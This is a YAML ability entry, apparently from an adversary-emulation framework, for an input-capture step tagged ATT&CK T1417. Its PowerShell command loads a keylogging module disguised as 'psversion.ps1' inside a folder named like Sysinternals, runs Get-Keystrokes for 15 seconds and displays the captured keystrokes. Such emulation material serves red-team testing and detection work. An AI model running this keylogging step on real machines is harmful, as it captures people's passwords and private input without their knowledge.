- id: db28f68d-e8b8-46e6-b680-642570d4b257
  name: 7.A.3 - Automated Collection (T1119) - Input Capture (T1417)
  description: Load custom PowerShell module, and grab keystrokes for 15 seconds.
  tactic: collection
  technique:
    attack_id: T1417
    name: Input Capture
  platforms:
    windows:
      psh,pwsh:
        command: "if (! $(test-path -path \"C:\\Program Files\\SysinternalsSuite\"\
          )) {\n  write-host \"[!] The path C:\\Program Files\\SysinternalsSuite does\
          \ not exist. Execution has stopped.\";\n  exit 1;\n}\nSet-Location -path\
          \ \"C:\\Program Files\\SysinternalsSuite\";\n. .\\psversion.ps1;\nGet-Keystrokes;\n\
          Start-Sleep -Seconds 15;\nView-Job -JobName \"Keystrokes\";\n"
